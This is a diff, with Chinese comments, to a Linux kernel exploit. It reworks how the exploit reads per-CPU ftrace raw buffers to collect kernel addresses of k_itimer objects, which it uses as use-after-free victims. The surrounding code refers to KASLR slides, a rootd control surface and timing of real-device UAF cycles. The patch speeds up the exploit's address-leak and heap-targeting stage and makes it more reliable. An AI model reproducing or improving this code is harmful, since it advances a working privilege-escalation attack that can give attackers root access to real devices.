@@ -28,6 +28,7 @@
 
 // get offset table from kernel_table.c
 #include "kernel_table.h"
+#include "rawscan.h"
 
 /*
  * rootd control surface (implemented in pc98260_rootd.c).
@@ -707,59 +708,176 @@ static int read_raw(uint8_t *buf, size_t cap, size_t *used)
 	return 0;
 }
 
+/*
+ * ------------------------------------------------------------------
+ * 多 CPU raw 采集（增量扫描 k_itimer 记录）
+ *
+ * 为什么不再「只读 cpu0 + alarm(2) 阻塞等满 2 秒」：
+ *
+ *  1) 旧实现是**死等**。collect_nth() 在 tracing_on=0 之后才去读 raw pipe，
+ *     此刻环形缓冲已经冻结、不会再有新记录 —— 那 2 秒（alarm 兜底）全部花在
+ *     阻塞的 read() 上。真机 2026-10-31 17:42 那轮日志里每个 uaf cycle
+ *     ~2.9 秒，其中 ~2.0 秒就是这段死等；一轮 4 个 cycle 白扔 8 秒。
+ *
+ *  2) 只读 cpu0 还有个更隐蔽的坑：造 timer 的子进程**不绑核**，它的分配记录
+ *     可能落在任意 CPU 上，cpu0 上有时一条都捞不到（[uaf] too few timers）。
+ *     calib.c 早就为此改成多 CPU 采集（见 calib.c 的 capture_raw），这里跟上。
+ *
+ * 语义保持（重要）：
+ *   - 仍然按「trace 记录出现顺序」取第 index 条当 victim；
+ *   - **先读完 cpu0 再考虑其它 CPU**，所以 cpu0 记录够用时 g_all[] 的内容与
+ *     顺序跟旧实现完全一致 → victim 也完全一致，不改变现有跑通路径的概率；
+ *   - cpu0 不够（index 拿不到）时才去补其它 CPU —— 只增不减。
+ * ------------------------------------------------------------------
+ */
+#define UAF_RAW_IDLE_MS 400
+#define UAF_RAW_DEADLINE_MS 2000
+#define UAF_RAW_MAXCPU 16
+#define UAF_RAW_CHUNK 16384
+
+/* 读缓冲：raw_scan_feed() 会把 tail 拼到数据前面 memcpy，扫描工作区在
+ * rawscan_state 内部，所以读缓冲与扫描缓冲必须分开（否则是自拷贝）。 */
+static uint8_t g_raw_read_buf[UAF_RAW_CHUNK];
+
+static uint64_t now_ms_uaf(void)
+{
+	struct timespec ts;
+	clock_gettime(CLOCK_MONOTONIC, &ts);
+	return (uint64_t)ts.tv_sec * 1000u + (uint64_t)(ts.tv_nsec / 1000000);
+}
+
+/*
+ * 读一组 raw pipe，直到每个 CPU 都安静满 UAF_RAW_IDLE_MS，或到达硬截止。
+ *
+ * 空闲早停：采集前 tracing_on 已关，缓冲里的数据是冻结的，排空即结束。
+ * 某个 CPU 一直安静 → 它就是空的（不会再有新数据），等下去没意义。
+ */
+static void raw_drain(int *fds, int nfds, struct rawscan_state *s, uint64_t deadline)
+{
+	struct pollfd pfds[UAF_RAW_MAXCPU];
+	uint64_t last_ms[UAF_RAW_MAXCPU];
+	int alive = nfds;
+	int i;
+
+	for (i = 0; i < nfds; i++)
+		last_ms[i] = now_ms_uaf();
+
+	while (alive > 0) {
+		uint64_t now = now_ms_uaf();
+		int ready;
+
+		if (now >= deadline)
+			break;
+		/* 逐个 CPU 判空闲 */
+		for (i = 0; i < nfds; i++) {
+			if (fds[i] < 0)
+				continue;
+			if (now - last_ms[i] >= (uint64_t)UAF_RAW_IDLE_MS) {
+				close(fds[i]);
+				fds[i] = -1;
+				alive--;
+			}
+		}
+		if (alive <= 0)
+			break;
+		for (i = 0; i < nfds; i++) {
+			pfds[i].fd = fds[i];
+			pfds[i].events = POLLIN;
+			pfds[i].revents = 0;
+		}
+		ready = poll(pfds, (nfds_t)nfds, 100);
+		if (ready < 0) {
+			if (errno == EINTR)
+				continue;
+			break;
+		}
+		if (ready == 0)
+			continue;
+		for (i = 0; i < nfds; i++) {
+			ssize_t got;
+			if (fds[i] < 0 || !(pfds[i].revents & POLLIN))
+				continue;
+			got = read(fds[i], g_raw_read_buf, UAF_RAW_CHUNK);
+			if (got <= 0) {
+				if (got < 0 && (errno == EINTR || errno == EAGAIN))
+					continue;
+				close(fds[i]);
+				fds[i] = -1;
+				alive--;
+				continue;
+			}
+			rawscan_feed(s, g_raw_read_buf, (size_t)got);
+			last_ms[i] = now_ms_uaf();
+		}
+	}
+	for (i = 0; i < nfds; i++) {
+		if (fds[i] >= 0) {
+			close(fds[i]);
+			fds[i] = -1;
+		}
+	}
+}
+
 static int collect_nth(int index, int *count, uint64_t *chosen)
 {
-	/* E3：复用全局 raw 缓冲（不再每次 malloc 8MB） */
-	uint8_t *buf = raw_buf(8U << 20);
-	size_t used = 0;
-	uint8_t needle[8];
+	static struct rawscan_state s;
+	int fds[UAF_RAW_MAXCPU];
+	int nfds, i;
 	/* 匹配键：运行期实测调用点 > 写死锚点（仅 6.6 可信） > 只按 req 匹配 */
 	uint64_t site = SITE_KITIMER_RT ? SITE_KITIMER_RT : slide_addr(TIMER_LINK);
 	int filter_by_site = (SITE_KITIMER_RT != 0) || STATIC_ANCHOR_TRUSTED;
-	int fd, n = 0;
-	if (!buf)
-		return -1;
-	memcpy(needle, &site, 8);
+	uint64_t deadline;
+
+	rawscan_init(&s, (const uint8_t *)&site, filter_by_site, KITIMER_SIZE,
+		     g_all, (int)(sizeof(g_all) / sizeof(g_all[0])), index);
 	*chosen = 0;
-	fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
-	if (fd < 0)
+
+	/* --- 阶段 A：cpu0 优先（候选顺序与旧实现一致）--- */
+	fds[0] = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
+	if (fds[0] < 0)
 		return -1;
-	alarm(2);
-	while (used + 4096 < (8U << 20)) {
-		ssize_t got = read(fd, buf + used, (8U << 20) - used);
-		if (got <= 0)
-			break;
-		used += (size_t)got;
+	deadline = now_ms_uaf() + UAF_RAW_DEADLINE_MS;
+	raw_drain(fds, 1, &s, deadline);
+
+	/* --- 阶段 B：cpu0 不够时才补其它 CPU --- */
+	if (s.out_n <= index) {
+		int ncpu = cpu_count();
+		if (ncpu > UAF_RAW_MAXCPU)
+			ncpu = UAF_RAW_MAXCPU;
+		nfds = 0;
+		for (i = 1; i < ncpu; i++) {
+			char path[96];
+			int fd;
+			snprintf(path, sizeof(path),
+				 TRACE "/per_cpu/cpu%d/trace_pipe_raw", i);
+			fd = open(path, O_RDONLY | O_CLOEXEC);
+			if (fd < 0)
+				continue;
+			fds[nfds++] = fd;
+		}
+		if (nfds) {
+			deadline = now_ms_uaf() + UAF_RAW_DEADLINE_MS;
+			raw_drain(fds, nfds, &s, deadline);
+		}
 	}
-	alarm(0);
-	close(fd);
-	/* B2 修复：needle 即 site（TIMER_LINK 的 slide 地址），memcmp 已保证
-	 * buf+i..i+8 与 needle 相等，再比较 got(=buf+i) 与 site 恒为真，属死代码。
-	 * 真正过滤只看 req（k_itimer 大小）与 ptr（内核地址特征），故删除 got。 */
-	for (size_t i = 0; i + 32 <= used; i++) {
-		uint64_t ptr, req;
-		if (filter_by_site && memcmp(buf + i, needle, 8))
-			continue;
-		memcpy(&ptr, buf + i + 8, 8);
-		memcpy(&req, buf + i + 24, 8);
-		if (req != KITIMER_SIZE || (ptr >> 48) != 0xffff || (ptr & 7))
-			continue;
-		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
-			g_all[n] = ptr;
-		*chosen = (n == index) ? ptr : *chosen;
-		n++;
-	}
-	/* E3：缓冲由 raw_buf 持有，不在此释放 */
-	*count = n;
-	g_all_n = n;
+
+	*count = s.out_n;
+	/*
+	 * g_all[] 只有 out_cap 个槽位，旧实现却把**命中总数**直接写进 g_all_n，
+	 * 而 build_watch() 按 g_all_n 去索引 g_all[] —— 命中数超过容量时就是越界读，
+	 * 读到的是随机 watch 项，「哪一页被复用」的判定会失真。这里夹到容量内。
+	 */
+	g_all_n = s.out_n < s.out_cap ? s.out_n : s.out_cap;
 	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
-		n, *chosen, used);
-	return (n > index && *chosen) ? 0 : -1;
+		s.out_n, s.chosen, s.bytes);
+	*chosen = s.chosen;
+	return (s.out_n > index && s.chosen) ? 0 : -1;
 }
 
 static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
 {
-	/* E3：复用全局 raw 缓冲（4MB 上限；若此前已被 collect_nth 扩到 8MB 则直接复用） */
+	/* E3：复用全局 raw 缓冲（4MB 上限）。collect_nth 已改成增量扫描，
+	 * 不再往这块缓冲里灌数据，所以这里自己按需分配即可。 */
 	uint8_t *buf = raw_buf(4U << 20);
 	size_t used = 0;
 	uint8_t needle[8];
